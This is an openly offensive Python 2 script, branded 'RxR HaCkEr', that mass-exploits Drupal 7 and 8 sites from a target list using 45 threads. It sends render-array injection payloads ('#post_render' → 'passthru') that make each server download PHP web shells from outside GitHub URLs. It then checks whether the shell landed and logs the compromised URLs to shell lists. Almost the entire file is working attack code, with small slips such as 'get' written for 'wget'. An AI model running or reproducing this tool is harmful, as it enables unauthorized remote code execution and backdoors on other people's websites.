import requests, sys, re, os
from time import time as timer
from multiprocessing.dummy import Pool as ThreadPool
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)										
import time
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 
#######################

try:
    with open(sys.argv[1], 'r') as f:
        woh = f.read().splitlines()
except IOError:
    pass
woh = list((woh))




class Drupal:

	def __init__(self):
	
		if system() == 'Linux':
			os.system('clear')
		if system() == 'Windows':
			os.system('cls')
		
			banner = """{}{} \n \n


			______       ______   _   _         _____  _     _____          
			| ___ \      | ___ \ | | | |       /  __ \| |   |  ___|        
			| |_/ /__  __| |_/ / | |_| |  __ _ | /  \/| | __| |__  _ __  
			|    / \ \/ /|    /  |  _  | / _` || |    | |/ /|  __|| '__|  
			| |\ \ >  < | |\ \ | | | || (_| || \__/\|   < | |___| |    
			\_| \_|/_/\_\\_| \_| \_| |_/ \__,_| \____/|_|\_\\____/|_|      
		 
						 
											
		   
			

				\n""".format(fc, sb)
		
			print banner
	



	def Drupal7(self, url):



		try:

			self.headers = {'User-Agent': 'Mozilla 5.0'}


			self.get_data = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':"wget https://raw.githubusercontent.com/MissProxy/uploadermissproxy/master/miss.php", 'name[#type]':'markup'}

			self.post_data = {'form_id':'user_pass', '_triggering_element_name':'name'}

			self.req_post = requests.post(url ,data=self.post_data, params=self.get_data, headers=self.headers)

			self.token = re.findall('name="form_build_id" value="(.*?)" />',self.req_post.content)

			self.get_input = {'q':'file/ajax/name/#value/' + self.token[0]}

			self.post_input = {'form_build_id':self.token[0]}

			self.lib_post = requests.post(url, data=self.post_input, params=self.get_input, headers=self.headers)


			self.uploading =  requests.get(url+"/d7.php", headers=self.headers)


			if 'RxR HaCkEr' in self.uploading.content:
				print '{}[Target]: {} {}    ====> {}{} Drupal (7)  {}{} eXploiting Done  '.format(sb, sd, url, fc,fc, sb,fg)
				open('Drupal7_shells.txt', 'a').write(url+"/d7.php"+'\n')
					
			
					
			else:
				print '{}[Target]: {} {}   ====> {}{}  Drupal (7)  {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
				
				





		except:
			pass



	def Drupal8(self, url):

		try:

			self.headers = {'User-Agent': 'Mozilla 5.0'}


			self.post_datas  = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':"get https://raw.githubusercontent.com/mjzrh1337/drupal/master/d8.php"}


			self.lib = requests.post(url + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax", data=self.post_datas, headers=self.headers)

			
			self.uploadings =  requests.get(url+"/rxr.php", headers=self.headers)


			if 'RxR HaCkEr' in self.uploadings.content:
				print '{}[Target]: {} {}    ====> {}{} Drupal (8)  {}{} eXploiting Done  '.format(sb, sd, url, fc,fc, sb,fg)
				open('Drupal8_shells.txt', 'a').write(url+"/rxr.php"+'\n')
					
					
			else:
				print '{}[Target]: {} {}   ====> {}{}  Drupal (8)  {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)






		except:
			pass




try:

	xDrupal = Drupal()

except:
	pass




def Exploit(url):

	try:
		xDrupal.Drupal7(url)
		xDrupal.Drupal8(url)

	except:
		pass

def Main():
    try:
        start = timer()
        pp = ThreadPool(45)
        pr = pp.map(Exploit, woh)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()
